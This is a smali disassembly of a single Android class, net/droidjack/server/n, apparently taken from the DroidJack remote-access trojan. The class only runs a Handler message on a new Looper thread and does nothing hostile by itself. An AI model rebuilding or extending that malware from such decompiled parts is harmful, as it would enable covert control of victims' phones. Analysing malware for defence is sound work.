.class Lnet/droidjack/server/n;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field private final synthetic a:Ljava/lang/String;


# direct methods
.method constructor <init>(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/n;->a:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    invoke-static {}, Landroid/os/Looper;->prepare()V

    new-instance v0, Lnet/droidjack/server/o;

    iget-object v1, p0, Lnet/droidjack/server/n;->a:Ljava/lang/String;

    invoke-direct {v0, p0, v1}, Lnet/droidjack/server/o;-><init>(Lnet/droidjack/server/n;Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/os/Handler;->obtainMessage()Landroid/os/Message;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/os/Handler;->dispatchMessage(Landroid/os/Message;)V

    invoke-static {}, Landroid/os/Looper;->loop()V

    return-void
.end method
